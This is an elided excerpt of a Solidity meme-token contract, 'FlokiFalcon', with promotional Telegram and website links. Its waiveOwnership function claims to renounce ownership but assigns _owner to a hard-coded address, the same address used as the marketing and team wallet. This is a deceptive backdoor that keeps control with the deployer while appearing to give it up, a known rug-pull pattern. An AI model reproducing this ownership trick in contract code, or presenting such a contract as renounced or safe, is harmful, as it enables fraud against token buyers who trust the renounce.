...
Telegram:https://t.me/+lhkbwrsHxjFhZjE8
Website: https://flokifalcon.site.xyz/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x28cFf02165Dbb7f238280bE4DEA00694ebDb16aa);
    }
...
contract FlokiFalcon is Context, IERC20, Ownable {
    ...
    string private _symbol = "FLOKI FALCON";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x28cFf02165Dbb7f238280bE4DEA00694ebDb16aa);
    address payable private teamWalletAddress = payable(0x28cFf02165Dbb7f238280bE4DEA00694ebDb16aa);
